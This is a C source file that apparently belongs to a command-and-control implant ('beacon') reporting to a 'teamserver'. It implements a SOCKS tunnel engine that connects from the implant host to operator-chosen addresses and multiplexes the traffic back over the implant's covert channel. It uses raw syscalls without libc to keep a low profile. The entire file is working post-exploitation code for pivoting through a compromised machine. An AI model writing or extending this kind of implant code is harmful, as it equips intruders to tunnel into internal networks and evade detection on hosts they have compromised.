/// proxyfire.c -- MUX tunnel engine for SOCKS proxy (beacon Proxyfire pattern)
///
/// All tunnel data is packed into the main communication channel.
/// Zero threads -- non-blocking polling in main loop via process_tunnels().

#include "proxyfire.h"
#include "jobs.h"
#include "crt.h"
#include "types.h"

#ifdef BUILD_SO
#include "elf_resolve.h"
#else
#ifdef ARCH_X86_64
#include "syscalls_x64.h"
#endif
#ifdef ARCH_AARCH64
#include "syscalls_aarch64.h"
#endif
#endif

// ── Constants ──

#ifndef AF_INET
#define AF_INET      2
#define SOCK_STREAM  1
#define SOL_SOCKET   1
#define SO_ERROR     4
#endif
#ifndef O_NONBLOCK
#define O_NONBLOCK 04000
#endif
#ifndef F_SETFL
#define F_SETFL    4
#define F_GETFL    3
#endif
#ifndef EINPROGRESS
#define EINPROGRESS  115
#endif

#define RECV_CHUNK_SIZE  (64 * 1024)   /* 64 KB per tunnel per cycle */
#define MAX_OBJ_SIZE     (4 * 1024 * 1024)  /* stop RecvProxy if collector > 4MB */

// ── Abstraction macros (same as tasks_net.c) ──

#ifdef BUILD_SO
#define PF_socket(d,t,p)       R_socket(d,t,p)
#define PF_connect(s,a,l)      R_connect(s,a,l)
#define PF_close(fd)           R_close(fd)
#define PF_read(fd,b,n)        R_read(fd,b,n)
#define PF_write(fd,b,n)       R_write(fd,b,n)
#define PF_fcntl(fd,c,a)       R_fcntl(fd,c,a)
#define PF_getsockopt(s,l,o,v,n) R_getsockopt(s,l,o,v,n)
#define PF_select(n,r,w,e,t)   R_select(n,r,w,e,t)
#else
#define PF_socket(d,t,p)       sys_socket(d,t,p)
#define PF_connect(s,a,l)      sys_connect(s,a,l)
#define PF_close(fd)           sys_close(fd)
#define PF_read(fd,b,n)        sys_read(fd,b,n)
#define PF_write(fd,b,n)       sys_write(fd,b,n)
#define PF_fcntl(fd,c,a)       sys_fcntl(fd,c,a)
#define PF_getsockopt(s,l,o,v,n) sys_getsockopt(s,l,o,v,n)
#endif

// ── fd_set (manual, no libc) ──

typedef struct {
    unsigned long fds_bits[1024 / (8 * sizeof(unsigned long))];
} pf_fd_set;

static void pf_fd_zero(pf_fd_set *s) {
    ax_memset(s, 0, sizeof(pf_fd_set));
}

static void pf_fd_set_bit(int fd, pf_fd_set *s) {
    s->fds_bits[fd / (8 * sizeof(unsigned long))] |= (1UL << (fd % (8 * sizeof(unsigned long))));
}

static int pf_fd_is_set(int fd, pf_fd_set *s) {
    return (s->fds_bits[fd / (8 * sizeof(unsigned long))] >> (fd % (8 * sizeof(unsigned long)))) & 1;
}

/// pselect6 wrapper with zero timeout (non-blocking poll)
static int pf_select_zero(int nfds, pf_fd_set *rfds, pf_fd_set *wfds) {
#ifdef BUILD_SO
    struct { long tv_sec; long tv_usec; } tv = {0, 0};
    return PF_select(nfds, rfds, wfds, (void*)0, &tv);
#else
    struct linux_timespec ts = { .tv_sec = 0, .tv_nsec = 0 };
    return sys_pselect6(nfds, rfds, wfds, (void*)0, &ts, (void*)0);
#endif
}

/// Get a monotonic-ish timestamp (seconds). For connect timeout tracking.
static uint32_t pf_now_sec(void) {
#ifdef BUILD_SO
    // SO mode -- no clock_gettime resolved, use nanosleep-based counter
    // Actually just use a simple counter incremented by main loop ticks.
    // For simplicity, we use the jiffies approach: read /proc/uptime.
    // But that's heavy. Instead, track elapsed via tunnel connect_start.
    // Return 0 — caller uses diff, so we need actual time.
    // Fallback: read /proc/uptime
    static uint32_t cached = 0;
    int fd = R_open("/proc/uptime", 0, 0);
    if (fd >= 0) {
        char buf[32] = {0};
        R_read(fd, buf, sizeof(buf) - 1);
        R_close(fd);
        // Parse integer part of uptime
        uint32_t secs = 0;
        for (int i = 0; buf[i] && buf[i] != '.'; i++) {
            if (buf[i] >= '0' && buf[i] <= '9')
                secs = secs * 10 + (buf[i] - '0');
        }
        cached = secs;
    }
    return cached;
#else
    // Static mode: read /proc/uptime via syscall
    int fd = sys_open("/proc/uptime", 0 /*O_RDONLY*/, 0);
    if (fd >= 0) {
        char buf[32] = {0};
        sys_read(fd, buf, sizeof(buf) - 1);
        sys_close(fd);
        uint32_t secs = 0;
        for (int i = 0; buf[i] && buf[i] != '.'; i++) {
            if (buf[i] >= '0' && buf[i] <= '9')
                secs = secs * 10 + (buf[i] - '0');
        }
        return secs;
    }
    return 0;
#endif
}

// ── Helper: pack a tunnel response Command into obj_collector ──

static void pack_tunnel_cmd(mp_writer_t *collector, uint32_t code,
                            const uint8_t *inner_data, uint32_t inner_len) {
    mp_writer_t cmd;
    mp_writer_init(&cmd, 128);
    mp_write_map(&cmd, 3);
    mp_write_kv_uint(&cmd, "code", code);
    mp_write_kv_uint(&cmd, "id", 0);
    mp_write_kv_bin(&cmd, "data", inner_data, inner_len);

    mp_write_bin(collector, cmd.buf.data, (uint32_t)cmd.buf.len);
    mp_writer_free(&cmd);
}

/// Pack TUNNEL_STATUS {channel_id, success, reason}
static void pack_tunnel_status(mp_writer_t *collector, int channel_id,
                               int success, int reason) {
    mp_writer_t inner;
    mp_writer_init(&inner, 32);
    mp_write_map(&inner, 3);
    mp_write_kv_int(&inner, "channel_id", channel_id);
    mp_write_kv_bool(&inner, "success", success ? true : false);
    mp_write_kv_int(&inner, "reason", reason);

    pack_tunnel_cmd(collector, COMMAND_TUNNEL_STATUS,
                    inner.buf.data, (uint32_t)inner.buf.len);
    mp_writer_free(&inner);
}

/// Pack TUNNEL_DATA {channel_id, data}
static void pack_tunnel_data(mp_writer_t *collector, int channel_id,
                             const uint8_t *data, uint32_t len) {
    mp_writer_t inner;
    mp_writer_init(&inner, 32 + len);
    mp_write_map(&inner, 2);
    mp_write_kv_int(&inner, "channel_id", channel_id);
    mp_write_kv_bin(&inner, "data", data, len);

    pack_tunnel_cmd(collector, COMMAND_TUNNEL_DATA,
                    inner.buf.data, (uint32_t)inner.buf.len);
    mp_writer_free(&inner);
}

/// Pack TUNNEL_CLOSE {channel_id, reason}
static void pack_tunnel_close(mp_writer_t *collector, int channel_id, int reason) {
    mp_writer_t inner;
    mp_writer_init(&inner, 32);
    mp_write_map(&inner, 2);
    mp_write_kv_int(&inner, "channel_id", channel_id);
    mp_write_kv_int(&inner, "reason", reason);

    pack_tunnel_cmd(collector, COMMAND_TUNNEL_CLOSE,
                    inner.buf.data, (uint32_t)inner.buf.len);
    mp_writer_free(&inner);
}

// ── Parse IP:port and create non-blocking socket ──

static int parse_and_connect(const char *address, int *out_fd) {
    char host_buf[256] = {0};
    uint16_t port = 0;
    const char *colon = (const char *)0;

    for (const char *p = address; *p; p++) {
        if (*p == ':') colon = p;
    }
    if (!colon) return -1;

    size_t hlen = (size_t)(colon - address);
    if (hlen >= sizeof(host_buf)) return -1;
    ax_memcpy(host_buf, address, hlen);
    host_buf[hlen] = '\0';

    for (const char *p = colon + 1; *p >= '0' && *p <= '9'; p++)
        port = port * 10 + (uint16_t)(*p - '0');
    if (port == 0) return -1;

    struct {
        uint16_t sin_family;
        uint16_t sin_port;
        uint32_t sin_addr;
        uint8_t  sin_zero[8];
    } addr;
    ax_memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = ((port >> 8) & 0xFF) | ((port & 0xFF) << 8);

    uint32_t octets[4] = {0};
    int oidx = 0;
    for (const char *p = host_buf; *p && oidx < 4; p++) {
        if (*p == '.') oidx++;
        else if (*p >= '0' && *p <= '9') octets[oidx] = octets[oidx] * 10 + (*p - '0');
    }
    addr.sin_addr = octets[0] | (octets[1] << 8) | (octets[2] << 16) | (octets[3] << 24);

    int fd = PF_socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;

    // Non-blocking
    PF_fcntl(fd, F_SETFL, O_NONBLOCK);

    int cr = PF_connect(fd, &addr, sizeof(addr));
    if (cr == 0) {
        // Immediate success (unlikely but possible on localhost)
        *out_fd = fd;
        return 1; // 1 = already connected
    }

    // Check for EINPROGRESS (connection in progress)
    // On Linux, connect() returns -EINPROGRESS for static syscalls
    // and -1 with errno=EINPROGRESS for libc. We check both patterns.
    if (cr == -EINPROGRESS || cr == -1) {
        *out_fd = fd;
        return 0; // 0 = connecting
    }

    PF_close(fd);
    return -1; // error
}

// ══════════════════════════════════════════════════════
//  Public API
// ══════════════════════════════════════════════════════

int proxy_connect_tcp(int tunnel_idx, const char *address) {
    job_context_t *ctx = &g_job_ctx;
    tunnel_entry_t *tun = &ctx->tunnels[tunnel_idx];

    int fd = -1;
    int ret = parse_and_connect(address, &fd);

    if (ret < 0) {
        // Immediate failure
        tun->client_fd = -1;
        tun->state = TUNNEL_STATE_CLOSED;
        return -1;
    }

    tun->client_fd = fd;
    if (ret == 1) {
        // Already connected
        tun->state = TUNNEL_STATE_READY;
    } else {
        // Connection in progress
        tun->state = TUNNEL_STATE_CONNECTING;
        tun->connect_start = pf_now_sec();
    }

    return 0;
}

void proxy_write_tcp(int channel_id, const uint8_t *data, uint32_t len) {
    job_context_t *ctx = &g_job_ctx;

    jobs_mutex_lock(&ctx->tunnels_mutex);
    int idx = tunnels_find(ctx, channel_id);
    if (idx < 0) {
        jobs_mutex_unlock(&ctx->tunnels_mutex);
        return;
    }

    tunnel_entry_t *tun = &ctx->tunnels[idx];
    if (!tun->active || tun->state == TUNNEL_STATE_CLOSED) {
        jobs_mutex_unlock(&ctx->tunnels_mutex);
        return;
    }

    // Grow write_buf if needed
    uint32_t needed = tun->write_len + len;
    if (needed > tun->write_cap) {
        uint32_t new_cap = tun->write_cap ? tun->write_cap : 4096;
        while (new_cap < needed) new_cap *= 2;
        uint8_t *new_buf = (uint8_t *)ax_realloc(tun->write_buf, new_cap);
        if (!new_buf) {
            jobs_mutex_unlock(&ctx->tunnels_mutex);
            return;
        }
        tun->write_buf = new_buf;
        tun->write_cap = new_cap;
    }

    ax_memcpy(tun->write_buf + tun->write_len, data, len);
    tun->write_len += len;
    jobs_mutex_unlock(&ctx->tunnels_mutex);
}

void proxy_pause(int channel_id) {
    job_context_t *ctx = &g_job_ctx;
    jobs_mutex_lock(&ctx->tunnels_mutex);
    int idx = tunnels_find(ctx, channel_id);
    if (idx >= 0) ctx->tunnels[idx].paused = 1;
    jobs_mutex_unlock(&ctx->tunnels_mutex);
}

void proxy_resume(int channel_id) {
    job_context_t *ctx = &g_job_ctx;
    jobs_mutex_lock(&ctx->tunnels_mutex);
    int idx = tunnels_find(ctx, channel_id);
    if (idx >= 0) ctx->tunnels[idx].paused = 0;
    jobs_mutex_unlock(&ctx->tunnels_mutex);
}

void proxy_close(int channel_id) {
    job_context_t *ctx = &g_job_ctx;
    jobs_mutex_lock(&ctx->tunnels_mutex);
    int idx = tunnels_find(ctx, channel_id);
    if (idx >= 0) {
        ctx->tunnels[idx].state = TUNNEL_STATE_CLOSED;
    }
    jobs_mutex_unlock(&ctx->tunnels_mutex);
}

// ══════════════════════════════════════════════════════
//  process_tunnels -- main loop polling (beacon pattern)
// ══════════════════════════════════════════════════════

int process_tunnels(mp_writer_t *obj_collector) {
    job_context_t *ctx = &g_job_ctx;
    int appended = 0;
    uint32_t now = pf_now_sec();

    // ────────────────────────────────────────
    // Stage 1: CheckProxy -- poll connecting sockets
    // ────────────────────────────────────────
    for (int i = 0; i < MAX_TUNNELS; i++) {
        if (!ctx->tunnels[i].active) continue;
        if (ctx->tunnels[i].state != TUNNEL_STATE_CONNECTING) continue;

        tunnel_entry_t *tun = &ctx->tunnels[i];

        // Timeout check
        if (now - tun->connect_start > TUNNEL_CONNECT_TIMEOUT) {
            PF_close(tun->client_fd);
            tun->client_fd = -1;
            tun->state = TUNNEL_STATE_CLOSED;
            pack_tunnel_status(obj_collector, tun->channel_id, 0, 4 /*timeout*/);
            appended++;
            continue;
        }

        // Poll for writability (connect complete)
        pf_fd_set wfds;
        pf_fd_zero(&wfds);
        pf_fd_set_bit(tun->client_fd, &wfds);

        int sr = pf_select_zero(tun->client_fd + 1, (pf_fd_set *)0, &wfds);
        if (sr <= 0) continue; // not ready yet

        if (pf_fd_is_set(tun->client_fd, &wfds)) {
            int err = 0;
            unsigned int errlen = sizeof(err);
            PF_getsockopt(tun->client_fd, SOL_SOCKET, SO_ERROR, &err, &errlen);

            if (err == 0) {
                tun->state = TUNNEL_STATE_READY;
                pack_tunnel_status(obj_collector, tun->channel_id, 1, 0);
            } else {
                PF_close(tun->client_fd);
                tun->client_fd = -1;
                tun->state = TUNNEL_STATE_CLOSED;
                pack_tunnel_status(obj_collector, tun->channel_id, 0, 5 /*refused*/);
            }
            appended++;
        }
    }

    // ────────────────────────────────────────
    // Stage 2: FlushProxy -- write buffered data to target sockets
    // ────────────────────────────────────────
    for (int i = 0; i < MAX_TUNNELS; i++) {
        if (!ctx->tunnels[i].active) continue;
        if (ctx->tunnels[i].state != TUNNEL_STATE_READY) continue;
        if (ctx->tunnels[i].write_len == 0) continue;

        tunnel_entry_t *tun = &ctx->tunnels[i];

        // Non-blocking write
        long n = PF_write(tun->client_fd, tun->write_buf, tun->write_len);
        if (n > 0) {
            // Shift remaining data
            uint32_t remaining = tun->write_len - (uint32_t)n;
            if (remaining > 0) {
                // Use manual byte-by-byte copy (memmove equivalent, safe for overlap)
                uint8_t *dst = tun->write_buf;
                uint8_t *src = tun->write_buf + n;
                for (uint32_t j = 0; j < remaining; j++)
                    dst[j] = src[j];
            }
            tun->write_len = remaining;

            // Check backpressure: if we were paused and buffer dropped, send RESUME
            if (tun->agent_paused && tun->write_len < TUNNEL_LOW_WATERMARK) {
                tun->agent_paused = 0;
                // Pack TUNNEL_RESUME as response to teamserver
                mp_writer_t inner;
                mp_writer_init(&inner, 16);
                mp_write_map(&inner, 1);
                mp_write_kv_int(&inner, "channel_id", tun->channel_id);
                pack_tunnel_cmd(obj_collector, COMMAND_TUNNEL_RESUME,
                                inner.buf.data, (uint32_t)inner.buf.len);
                mp_writer_free(&inner);
                appended++;
            }
        } else if (n == 0 || (n < 0 && n != -11 /*EAGAIN*/)) {
            // Write error or EOF → close
            tun->state = TUNNEL_STATE_CLOSED;
        }

        // Backpressure: buffer too large → tell teamserver to pause
        if (!tun->agent_paused && tun->write_len > TUNNEL_HIGH_WATERMARK) {
            tun->agent_paused = 1;
            mp_writer_t inner;
            mp_writer_init(&inner, 16);
            mp_write_map(&inner, 1);
            mp_write_kv_int(&inner, "channel_id", tun->channel_id);
            pack_tunnel_cmd(obj_collector, COMMAND_TUNNEL_PAUSE,
                            inner.buf.data, (uint32_t)inner.buf.len);
            mp_writer_free(&inner);
            appended++;
        }

        // Hard cap: kill the channel
        if (tun->write_len > TUNNEL_HARD_CAP) {
            tun->state = TUNNEL_STATE_CLOSED;
        }
    }

    // ────────────────────────────────────────
    // Stage 3: RecvProxy -- read from target sockets, pack TUNNEL_DATA
    // ────────────────────────────────────────
    uint8_t recv_buf[RECV_CHUNK_SIZE];

    for (int i = 0; i < MAX_TUNNELS; i++) {
        if (!ctx->tunnels[i].active) continue;
        if (ctx->tunnels[i].state != TUNNEL_STATE_READY) continue;
        if (ctx->tunnels[i].paused) continue;

        // Stop if collector is already large (packer size limit)
        if (obj_collector->buf.len > (int)MAX_OBJ_SIZE) break;

        tunnel_entry_t *tun = &ctx->tunnels[i];

        // Non-blocking read check
        pf_fd_set rfds;
        pf_fd_zero(&rfds);
        pf_fd_set_bit(tun->client_fd, &rfds);

        int sr = pf_select_zero(tun->client_fd + 1, &rfds, (pf_fd_set *)0);
        if (sr <= 0) continue;

        if (pf_fd_is_set(tun->client_fd, &rfds)) {
            long n = PF_read(tun->client_fd, recv_buf, RECV_CHUNK_SIZE);
            if (n > 0) {
                pack_tunnel_data(obj_collector, tun->channel_id,
                                 recv_buf, (uint32_t)n);
                appended++;
            } else if (n == 0) {
                // EOF — target closed the connection
                tun->state = TUNNEL_STATE_CLOSED;
            } else if (n != -11 /*EAGAIN*/) {
                // Read error
                tun->state = TUNNEL_STATE_CLOSED;
            }
        }
    }

    // ────────────────────────────────────────
    // Stage 4: CloseProxy -- cleanup closed tunnels
    // ────────────────────────────────────────
    for (int i = 0; i < MAX_TUNNELS; i++) {
        if (!ctx->tunnels[i].active) continue;
        if (ctx->tunnels[i].state != TUNNEL_STATE_CLOSED) continue;

        tunnel_entry_t *tun = &ctx->tunnels[i];

        // Close socket if still open
        if (tun->client_fd >= 0) {
            PF_close(tun->client_fd);
            tun->client_fd = -1;
        }

        // Free write buffer
        if (tun->write_buf) {
            ax_free(tun->write_buf);
            tun->write_buf = (uint8_t *)0;
        }
        tun->write_len = 0;
        tun->write_cap = 0;

        // Pack close notification
        pack_tunnel_close(obj_collector, tun->channel_id, 0);
        appended++;

        // Mark slot as free
        tun->active = 0;
        tun->channel_id = 0;
    }

    return appended;
}
